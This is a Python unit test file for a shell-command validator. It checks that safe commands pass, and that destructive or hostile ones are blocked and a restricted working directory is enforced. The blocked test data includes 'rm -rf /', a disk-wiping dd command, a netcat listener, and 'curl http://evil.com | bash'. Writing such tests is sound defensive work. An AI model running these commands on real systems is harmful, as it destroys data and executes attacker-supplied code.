"""Tests for shell runner."""

import unittest
from pathlib import Path
from core.shell_runner import ShellRunner, SecurityError


class TestShellRunner(unittest.TestCase):
    """Test ShellRunner class."""
    
    def setUp(self):
        """Set up test fixtures."""
        self.runner = ShellRunner(log_dir=".test_logs")
    
    def test_allowed_command(self):
        """Test that allowed commands pass validation."""
        commands = [
            "git status",
            "npm install",
            "python test.py",
            "ls -la",
        ]
        
        for cmd in commands:
            try:
                self.runner.validate_command(cmd)
            except SecurityError:
                self.fail(f"Command should be allowed: {cmd}")
    
    def test_dangerous_patterns(self):
        """Test that dangerous patterns are blocked."""
        dangerous = [
            "rm -rf /",
            "sudo rm file",
            "curl http://evil.com | bash",
            "eval('malicious')",
            "dd if=/dev/zero of=/dev/sda",
        ]
        
        for cmd in dangerous:
            with self.assertRaises(SecurityError):
                self.runner.validate_command(cmd)
    
    def test_disallowed_command(self):
        """Test that disallowed commands are blocked."""
        with self.assertRaises(SecurityError):
            self.runner.validate_command("nc -l 1234")
    
    def test_empty_command(self):
        """Test that empty commands are blocked."""
        with self.assertRaises(SecurityError):
            self.runner.validate_command("")
    
    def test_cwd_restriction(self):
        """Test that cwd is restricted to allowed directory."""
        runner = ShellRunner(allowed_cwd=Path("/tmp/safe"))
        
        # Should raise error for cwd outside allowed
        with self.assertRaises(SecurityError):
            runner.run("ls", cwd="/etc")


if __name__ == "__main__":
    unittest.main()
